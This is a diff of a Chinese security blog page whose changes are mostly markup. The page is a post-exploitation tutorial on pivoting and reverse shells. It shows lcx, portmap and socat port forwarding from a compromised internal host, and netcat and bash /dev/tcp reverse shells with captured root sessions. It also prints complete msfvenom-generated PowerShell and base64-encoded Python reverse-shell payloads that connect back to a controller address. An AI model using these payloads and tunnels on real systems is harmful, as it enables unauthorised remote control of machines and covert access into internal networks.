@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    1.9k
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -468,71 +471,81 @@
 <h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
 <li>内网端口转发</li>
 </ul>
-<pre><code>内网失陷主机
+<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
 lcx.exe -slave rhost rport lhost lport
 
 公网代理主机
-lcx.exe -listen lport1 lport2</code></pre>
-<pre><code>内网失陷主机
+lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
 lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389
 
 公网代理主机
-lcx.exe -listen 4444 5555</code></pre>
+lcx.exe -listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p>
 <ul>
 <li>本地端口映射</li>
 </ul>
 <p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p>
-<pre><code>lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
 <li>内网端口转发</li>
 </ul>
-<pre><code>内网失陷主机
-./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444
+<pre class="line-numbers language-none"><code class="language-none">内网失陷主机
+.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444
 
 公网代理主机
-./portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555</code></pre>
+.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p>
 <h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
 <p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p>
-<pre><code>-l 开启监听状态
+<pre class="line-numbers language-none"><code class="language-none">-l 开启监听状态
 -v 显示详细信息
 -p 指定监听的本地端口
 -k 客户端断掉连接时，服务端依然保持运行
 -e 将传入的信息以命令执行
--n 直接使用 IP 地址，不进行 dns 解析过程</code></pre>
+-n 直接使用 IP 地址，不进行 dns 解析过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p>
-<pre><code>nc -vv rhost rport</code></pre>
-<pre><code>&gt; nc -v 172.16.214.43 22
-Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!
-SSH-2.0-OpenSSH_8.4p1 Debian-3</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&gt; nc -v 172.16.214.43 22
+Connection to 172.16.214.43 port 22 [tcp&#x2F;ssh] succeeded!
+SSH-2.0-OpenSSH_8.4p1 Debian-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p>
 <p><strong>-e 指定反弹 shell</strong></p>
-<pre><code># 失陷主机
-nc -lvp lport -e /bin/bash        # linux 主机
-nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
+nc -lvp lport -e &#x2F;bin&#x2F;bash		# linux 主机
+nc -lvp lport -e c:\windows\system32\cmd.exe 	# windows 主机
 
 # 控制端
-nc rhost rport</code></pre>
-<pre><code># 失陷主机
-&gt; nc -lvp 4444 -e /bin/bash
+nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
+&gt; nc -lvp 4444 -e &#x2F;bin&#x2F;bash
 listening on [any] 4444 ...
 172.16.214.1: inverse host lookup failed: Unknown host
 connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628
 
 # 控制端
 &gt; nc -v 172.16.214.43 4444
-Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!
+Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!
 whoami
-root</code></pre>
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>-c 指定反弹 shell</strong></p>
-<pre><code># 失陷主机
-nc -lvp lprot -c bash    # linux 主机
-nc -lvp lport -c cmd     # windows 主机
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
+nc -lvp lprot -c bash	# linux 主机
+nc -lvp lport -c cmd 	# windows 主机
 
 # 控制端
-nc rhost rport</code></pre>
-<pre><code># 失陷主机
+nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
 &gt; nc -lvp 4444 -c bash
 listening on [any] 4444 ...
 172.16.214.1: inverse host lookup failed: Unknown host
@@ -540,80 +553,93 @@ connect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635
 
 # 控制端
 &gt; nc -v 172.16.214.43 4444
-Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!
+Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!
 whoami
-root</code></pre>
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>结合其他语言进行反弹 shell</strong></p>
-<pre><code># 失陷主机
-bash -i &gt;&amp; /dev/tcp/rhost/rport 0&gt;&amp;1
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
+bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;rhost&#x2F;rport 0&gt;&amp;1
 
 # 控制端
-nc -lvp lprot</code></pre>
-<pre><code># 失陷主机
-&gt; bash -i &gt;&amp; /dev/tcp/172.16.214.43/4444 0&gt;&amp;1
+nc -lvp lprot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
+&gt; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.214.43&#x2F;4444 0&gt;&amp;1
 
 # 控制端
 &gt; nc -lp 4444
 root@ubuntu:~# whoami
 whoami
-root</code></pre>
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p>
 <p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p>
-<pre><code># 控制端
-&gt; msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444
+<pre class="line-numbers language-none"><code class="language-none"># 控制端
+&gt; msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;172.16.214.43 lport&#x3D;4444
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 1586 bytes
-powershell -w hidden -nop -c $a=&#39;172.16.214.43&#39;;$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str=$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;
+powershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3D;New-Object system.net.sockets.tcpclient;$nb&#x3D;New-Object System.Byte[] $c.ReceiveBufferSize;$ob&#x3D;New-Object System.Byte[] 65536;$eb&#x3D;New-Object System.Byte[] 65536;$e&#x3D;new-object System.Text.UTF8Encoding;$p&#x3D;New-Object System.Diagnostics.Process;$p.StartInfo.FileName&#x3D;&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput&#x3D;1;$p.StartInfo.RedirectStandardOutput&#x3D;1;$p.StartInfo.RedirectStandardError&#x3D;1;$p.StartInfo.UseShellExecute&#x3D;0;$q&#x3D;$p.Start();$is&#x3D;$p.StandardInput;$os&#x3D;$p.StandardOutput;$es&#x3D;$p.StandardError;$osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s&#x3D;$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r&#x3D;$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r&#x3D;$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r&#x3D;$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str&#x3D;$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;
 
-&gt; nc -lvp 4444</code></pre>
+&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p>
-<pre><code># 控制端
-&gt; msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444
+<pre class="line-numbers language-none"><code class="language-none"># 控制端
+&gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444
 [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 505 bytes
-python -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#39;)[0]))&quot;
+python -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik&#x3D;&#39;)[0]))&quot;
 
-&gt; nc -lvp 4444</code></pre>
+&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p>
 <h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p>
 <p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p>
 <h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p>
-<pre><code>&gt; socat - ./test.txt      # 相对路径读取
+<pre class="line-numbers language-none"><code class="language-none">&gt; socat - .&#x2F;test.txt  	# 相对路径读取
 test
 
-&gt; socat - /tmp/test.txt    # 绝对路径读取
-test</code></pre>
+&gt; socat - &#x2F;tmp&#x2F;test.txt	# 绝对路径读取
+test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>写入文件</strong></p>
-<pre><code>&gt; echo &quot;hello world&quot; | socat - ./test.txt
-&gt; socat - ./test.txt
+<pre class="line-numbers language-none"><code class="language-none">&gt; echo &quot;hello world&quot; | socat - .&#x2F;test.txt
+&gt; socat - .&#x2F;test.txt
 test
-hello world</code></pre>
+hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p>
-<pre><code>&gt; socat - TCP:172.16.214.1:22
-SSH-2.0-OpenSSH_7.4</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&gt; socat - TCP:172.16.214.1:22
+SSH-2.0-OpenSSH_7.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><strong>监听端口</strong></p>
-<pre><code>socat - TCP-LISTEN:8002</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p>
 <p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p>
-<pre><code>socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p>
-<pre><code>socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><strong>转发 UDP 端口</strong></p>
 <p>和上面一样，将 TCP 改成 UDP 即可</p>
-<pre><code>socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><strong>NAT 映射</strong></p>
 <p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p>
-<pre><code># 内网主机
+<pre class="line-numbers language-none"><code class="language-none"># 内网主机
 socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389
 
 # 公网主机
-socat tcp-listen:4444 tcp-listen:5555</code></pre>
+socat tcp-listen:4444 tcp-listen:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p>
 <p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p>
 <blockquote>
@@ -1049,7 +1075,7 @@ socat tcp-listen:4444 tcp-listen:5555</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
